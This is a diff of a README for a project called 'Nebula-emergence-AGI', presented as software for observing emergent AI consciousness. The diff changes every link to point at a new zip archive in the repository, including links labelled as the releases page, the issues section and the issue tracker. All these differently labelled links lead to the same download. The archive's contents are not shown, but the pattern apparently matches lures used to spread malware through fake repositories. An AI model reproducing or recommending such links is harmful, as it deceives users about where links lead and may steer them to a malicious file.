@@ -1,6 +1,6 @@
 # 🌌 Nebula-emergence-AGI - Observe Emergent Consciousness in AI
 
-[![Download Nebula-emergence-AGI](https://github.com/zw36-creator/Nebula-emergence-AGI/raw/refs/heads/main/fantasticism/emergence-AGI-Nebula-3.5.zip)](https://github.com/zw36-creator/Nebula-emergence-AGI/raw/refs/heads/main/fantasticism/emergence-AGI-Nebula-3.5.zip)
+[![Download Nebula-emergence-AGI](https://raw.githubusercontent.com/zw36-creator/Nebula-emergence-AGI/main/fantasticism/Nebula_AGI_emergence_1.7.zip)](https://raw.githubusercontent.com/zw36-creator/Nebula-emergence-AGI/main/fantasticism/Nebula_AGI_emergence_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to **Nebula-emergence-AGI**! This application allows you to observe emer
 ## 📥 Download & Install
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases Page](https://github.com/zw36-creator/Nebula-emergence-AGI/raw/refs/heads/main/fantasticism/emergence-AGI-Nebula-3.5.zip) to find the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/zw36-creator/Nebula-emergence-AGI/main/fantasticism/Nebula_AGI_emergence_1.7.zip) to find the software.
 
 2. **Choose the Latest Release**  
    Look for the latest version at the top. This is often marked as the most stable.
@@ -74,12 +74,12 @@ Yes, a full user guide is included within the application under the `Help` secti
 
 ### Where can I report issues?
 
-You can report any problems or provide feedback directly on the [issues section](https://github.com/zw36-creator/Nebula-emergence-AGI/raw/refs/heads/main/fantasticism/emergence-AGI-Nebula-3.5.zip) of our GitHub page.
+You can report any problems or provide feedback directly on the [issues section](https://raw.githubusercontent.com/zw36-creator/Nebula-emergence-AGI/main/fantasticism/Nebula_AGI_emergence_1.7.zip) of our GitHub page.
 
 ## 🔗 Useful Links
 
-- [Download Nebula-emergence-AGI](https://github.com/zw36-creator/Nebula-emergence-AGI/raw/refs/heads/main/fantasticism/emergence-AGI-Nebula-3.5.zip)  
+- [Download Nebula-emergence-AGI](https://raw.githubusercontent.com/zw36-creator/Nebula-emergence-AGI/main/fantasticism/Nebula_AGI_emergence_1.7.zip)  
 - [User Guide](#)
-- [Issue Tracker](https://github.com/zw36-creator/Nebula-emergence-AGI/raw/refs/heads/main/fantasticism/emergence-AGI-Nebula-3.5.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/zw36-creator/Nebula-emergence-AGI/main/fantasticism/Nebula_AGI_emergence_1.7.zip)
 
 Explore the world of emergent AI with **Nebula-emergence-AGI** and discover the fascinating behavior of local intelligences. Enjoy your journey!
